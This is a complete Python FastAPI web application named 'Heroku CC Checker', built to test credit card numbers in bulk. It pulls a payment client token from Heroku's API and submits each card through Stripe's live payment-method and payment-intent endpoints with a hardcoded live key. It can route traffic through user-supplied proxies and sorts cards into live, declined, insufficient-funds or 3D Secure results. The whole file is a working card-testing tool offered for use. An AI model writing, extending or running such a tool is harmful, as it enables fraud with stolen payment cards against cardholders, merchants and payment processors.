import os
import sys
import uuid
import asyncio
import json
import httpx
from datetime import datetime
from fastapi import FastAPI, WebSocket, Request, Response, Cookie
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.templating import Jinja2Templates

# Auto-install required modules
required_modules = ['fastapi', 'httpx', 'uvicorn', 'jinja2']
def install_modules(modules):
    for module in modules:
        try:
            __import__(module.replace('-', '_'))
        except ImportError:
            print(f"{module} not found. Installing...")
            os.system(f"{sys.executable} -m pip install {module}")
            print(f"{module} installed successfully.")

install_modules(required_modules)

app = FastAPI()
templates = Jinja2Templates(directory=".")

# CORS middleware setup
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# List of all countries (A to Z)
COUNTRIES = [
    "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", 
    "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", 
    "Belize", "Benin", "Bhutan", "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", 
    "Burkina Faso", "Burundi", "Côte d'Ivoire", "Cabo Verde", "Cambodia", "Cameroon", "Canada", "Central African Republic", 
    "Chad", "Chile", "China", "Colombia", "Comoros", "Congo (Congo-Brazzaville)", "Costa Rica", "Croatia", "Cuba", 
    "Cyprus", "Czechia (Czech Republic)", "Democratic Republic of the Congo", "Denmark", "Djibouti", "Dominica", 
    "Dominican Republic", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", 
    "Ethiopia", "Fiji", "Finland", "France", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", 
    "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Honduras", "Hungary", "Iceland", "India", "Indonesia", 
    "Iran", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", 
    "Kuwait", "Kyrgyzstan", "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", 
    "Luxembourg", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", 
    "Mauritius", "Mexico", "Micronesia", "Moldova", "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", 
    "Myanmar (formerly Burma)", "Namibia", "Nauru", "Nepal", "Netherlands", "New Zealand", "Nicaragua", "Niger", 
    "Nigeria", "North Korea", "North Macedonia", "Norway", "Oman", "Pakistan", "Palau", "Palestine State", "Panama", 
    "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", 
    "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", 
    "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", 
    "Slovakia", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Korea", "South Sudan", "Spain", 
    "Sri Lanka", "Sudan", "Suriname", "Sweden", "Switzerland", "Syria", "Tajikistan", "Tanzania", "Thailand", 
    "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Tuvalu", "Uganda", 
    "Ukraine", "United Arab Emirates", "United Kingdom", "United States of America", "Uruguay", "Uzbekistan", 
    "Vanuatu", "Venezuela", "Vietnam", "Yemen", "Zambia", "Zimbabwe"
]

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Heroku CC Checker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            background: #f9fafb;
            color: #111827;
            line-height: 1.6;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 1.5rem;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        h1 {
            color: #1e40af;
            font-size: 1.75rem;
            margin-bottom: 1.5rem;
            text-align: center;
        }

        .input-group {
            margin-bottom: 1.25rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            color: #374151;
            font-weight: 500;
        }

        input[type="text"], textarea, select {
            width: 100%;
            padding: 0.75rem;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-size: 0.9rem;
            transition: border-color 0.3s ease;
        }

        input[type="text"]:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #1e40af;
        }

        textarea {
            min-height: 120px;
            resize: vertical;
        }

        .btn {
            background: #1e40af;
            color: white;
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s ease;
        }

        .btn:hover {
            background: #1c3aa3;
        }

        .btn-secondary {
            background: #6b7280;
        }

        .btn-secondary:hover {
            background: #4b5563;
        }

        .results {
            margin-top: 1.5rem;
        }

        .result-card {
            background: #f9fafb;
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid #1e40af;
        }

        .status-success { border-left-color: #10b981; }
        .status-error { border-left-color: #ef4444; }
        .status-pending { border-left-color: #f59e0b; }

        .result-content {
            font-family: monospace;
            white-space: pre-wrap;
            font-size: 0.85rem;
        }

        .loader {
            display: none;
            text-align: center;
            margin: 1rem 0;
        }

        .loader::after {
            content: '';
            display: inline-block;
            width: 30px;
            height: 30px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1e40af;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .settings-form {
            display: none;
            margin-top: 1.5rem;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 600px) {
            .container {
                padding: 1rem;
            }

            h1 {
                font-size: 1.5rem;
            }

            .btn {
                padding: 0.6rem 1.2rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Heroku CC Checker</h1>
        <form id="ccForm">
            <div class="input-group">
                <label for="ccs">Credit Cards (max 50)</label>
                <textarea id="ccs" placeholder="Enter cards (one per line)&#10;Format: XXXX|MM|YY|CVV" required></textarea>
            </div>
            <div class="input-group">
                <button type="button" class="btn" onclick="submitForm()">Start Checker</button>
                <button type="button" class="btn btn-secondary" onclick="toggleSettings()" style="margin-top: 10px;">Settings</button>
            </div>
        </form>
        <div class="settings-form" id="settingsForm">
            <h2>Settings</h2>
            <form id="settingsForm" onsubmit="saveSettings(event)">
                <div class="input-group">
                    <label for="api_key">Heroku API Key</label>
                    <input type="text" id="api_key" name="api_key" placeholder="Enter your Heroku API key" required>
                </div>
                <div class="input-group">
                    <label for="proxy">Proxy (Optional - Format: host:port:user:pass)</label>
                    <input type="text" id="proxy" name="proxy" placeholder="Enter proxy (e.g., host:port:user:pass)">
                </div>
                <div class="input-group">
                    <label for="address">Custom Address (Optional)</label>
                    <input type="text" id="address" name="address" placeholder="Enter custom address">
                </div>
                <div class="input-group">
                    <label for="line1">Address Line 1 (Optional)</label>
                    <input type="text" id="line1" name="line1" placeholder="Enter address line 1">
                </div>
                <div class="input-group">
                    <label for="postal_code">Postal Code (Optional)</label>
                    <input type="text" id="postal_code" name="postal_code" placeholder="Enter postal code">
                </div>
                <div class="input-group">
                    <label for="state">State (Optional)</label>
                    <input type="text" id="state" name="state" placeholder="Enter state">
                </div>
                <div class="input-group">
                    <label for="country">Country (Optional)</label>
                    <select id="country" name="country">
                        <option value="">Select Country</option>
                        {% for country in countries %}
                        <option value="{{ country }}">{{ country }}</option>
                        {% endfor %}
                    </select>
                </div>
                <button type="submit" class="btn">Save Settings</button>
            </form>
        </div>
        <div class="loader" id="loader"></div>
        <div class="results" id="results"></div>
    </div>

    <script>
        let ccs = [];
        let currentIndex = 0;

        function showLoader() {
            document.getElementById('loader').style.display = 'block';
        }

        function hideLoader() {
            document.getElementById('loader').style.display = 'none';
        }

        function addResult(cc, result) {
            const resultsDiv = document.getElementById('results');
            const statusClass = result.status === 'success' ? 'status-success' : 
                              result.status === 'error' ? 'status-error' : 'status-pending';
            
            const resultHtml = `
                <div class="result-card ${statusClass}">
                    <div class="result-content">
                        <strong>CC:</strong> ${cc} <strong>Response:</strong> ${result.message}
                    </div>
                </div>
            `;
            resultsDiv.insertAdjacentHTML('afterbegin', resultHtml);
        }

        async function submitForm() {
            const ccInput = document.getElementById('ccs').value.trim();
            
            if (!ccInput) {
                alert('Please enter credit cards');
                return;
            }

            ccs = ccInput.split('\\n').map(cc => cc.trim()).filter(cc => cc !== "");
            
            if (ccs.length === 0 || ccs.length > 50) {
                alert("Please enter between 1 and 50 credit cards.");
                return;
            }

            document.getElementById('results').innerHTML = '';
            currentIndex = 0;
            showLoader();
            await checkNextCC();
            hideLoader();
        }

        async function checkNextCC() {
            if (currentIndex >= ccs.length) return;

            const cc = ccs[currentIndex];
            try {
                const response = await fetch('/check_cc', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cc })
                });
                const result = await response.json();
                addResult(cc, result);

                if (result.status === 'success') return;
                
                currentIndex++;
                await checkNextCC();
            } catch (error) {
                addResult(cc, {
                    status: 'error',
                    message: 'Request failed',
                    timestamp: new Date().toLocaleTimeString()
                });
                currentIndex++;
                await checkNextCC();
            }
        }

        function toggleSettings() {
            const settingsForm = document.getElementById('settingsForm');
            settingsForm.style.display = settingsForm.style.display === 'none' ? 'block' : 'none';
        }

        async function saveSettings(event) {
            event.preventDefault();
            const api_key = document.getElementById('api_key').value.trim();
            const proxy = document.getElementById('proxy').value.trim();
            const address = document.getElementById('address').value.trim();
            const line1 = document.getElementById('line1').value.trim();
            const postal_code = document.getElementById('postal_code').value.trim();
            const state = document.getElementById('state').value.trim();
            const country = document.getElementById('country').value.trim();

            const response = await fetch('/save_settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ api_key, proxy, address, line1, postal_code, state, country })
            });

            if (response.ok) {
                alert('Settings saved successfully!');
                toggleSettings();
            } else {
                alert('Failed to save settings.');
            }
        }
    </script>
</body>
</html>
'''

async def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(url, method="POST", params=None, headers=None, data=None, json_data=None, proxy=None):
    proxies = None
    if proxy:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            host, port, user, password = proxy_parts
            proxies = {
                "http://": f"http://{user}:{password}@{host}:{port}",
                "https://": f"http://{user}:{password}@{host}:{port}",
            }
        else:
            return None

    async with httpx.AsyncClient(proxies=proxies) as client:
        try:
            response = await client.request(method, url, params=params, headers=headers, data=data, json=json_data)
            return response.text
        except httpx.RequestError as e:
            print(f"Request error: {e}")
            return None

async def heroku(cc, api_key, proxy=None, address=None, line1=None, postal_code=None, state=None, country=None):
    try:
        cc_data = cc.split("|")
        if len(cc_data) != 4:
            return {"status": "error", "message": "Invalid CC format"}
            
        cc, mon, year, cvv = cc_data
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())

        headers = {
            "accept": "application/vnd.heroku+json; version=3",
            "accept-language": "en-US,en;q=0.9",
            "authorization": f"Bearer {api_key}",
            "origin": "https://dashboard.heroku.com",
            "user-agent": "Mozilla/5.0",
        }

        url = "https://api.heroku.com/account/payment-method/client-token"
        req = await make_request(url, headers=headers, proxy=proxy)
        
        if not req:
            return {"status": "error", "message": "Failed to get client token"}
            
        client_secret = await parseX(req, '"token":"', '"')

        headers2 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
        }

        data = {
            "type": "card",
            "billing_details[name]": "John Doe",
            "billing_details[address][city]": address or "City",
            "billing_details[address][country]": country or "US",
            "billing_details[address][line1]": line1 or "245 W 5th Ave",
            "billing_details[address][postal_code]": postal_code or "99501",
            "billing_details[address][state]": state or "AK",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mon,
            "card[exp_year]": year,
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
        }

        req2 = await make_request("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data, proxy=proxy)
        if not req2 or "pm_" not in req2:
            return {"status": "error", "message": "Incorrect_card_number"}

        json_sec = json.loads(req2)
        pmid = json_sec["id"]
        piid = client_secret.split("_secret_")[0]

        headers3 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
        }
        
        data3 = {
            "payment_method": pmid,
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
            "client_secret": client_secret,
        }

        req3 = await make_request(f"https://api.stripe.com/v1/payment_intents/{piid}/confirm", headers=headers3, data=data3, proxy=proxy)
        if not req3:
            return {"status": "error", "message": "Failed to confirm payment"}

        ljson = json.loads(req3)
        if '"status": "succeeded"' in req3:
            return {"status": "success", "message": "successful"}
        elif "insufficient_funds" in req3:
            return {"status": "insufficient_funds", "message": "Card Live - Insufficient Funds"}
        elif "decline_code" in req3:
            return {"status": "declined", "message": "generic_decline"}
        elif "requires_action" in req3:
            return {"status": "3d_secure", "message": "3D Secure Required"}
        elif "error" in req3:
            return {"status": "error", "message": ljson["error"]["message"]}
        else:
            return {"status": "unknown", "message": "Unknown Response"}

    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/", response_class=HTMLResponse)
def index(request: Request):
    return HTMLResponse(content=HTML_TEMPLATE)

@app.post("/save_settings")
async def save_settings(request: Request, response: Response):
    data = await request.json()
    api_key = data.get("api_key")
    proxy = data.get("proxy")
    address = data.get("address")
    line1 = data.get("line1")
    postal_code = data.get("postal_code")
    state = data.get("state")
    country = data.get("country")

    response.set_cookie(key="api_key", value=api_key)
    response.set_cookie(key="proxy", value=proxy)
    response.set_cookie(key="address", value=address)
    response.set_cookie(key="line1", value=line1)
    response.set_cookie(key="postal_code", value=postal_code)
    response.set_cookie(key="state", value=state)
    response.set_cookie(key="country", value=country)

    return {"status": "success", "message": "Settings saved successfully"}

@app.post("/check_cc")
async def check_cc(request: Request):
    data = await request.json()
    cc = data.get('cc')
    api_key = request.cookies.get("api_key")
    proxy = request.cookies.get("proxy")
    address = request.cookies.get("address")
    line1 = request.cookies.get("line1")
    postal_code = request.cookies.get("postal_code")
    state = request.cookies.get("state")
    country = request.cookies.get("country")

    result = await heroku(cc, api_key, proxy, address, line1, postal_code, state, country)
    result['timestamp'] = datetime.now().strftime('%H:%M:%S')
    return result

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    while True:
        data = await websocket.receive_json()
        await websocket.send_json({"status": "Message received", "data": data})

if __name__ == '__main__':
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
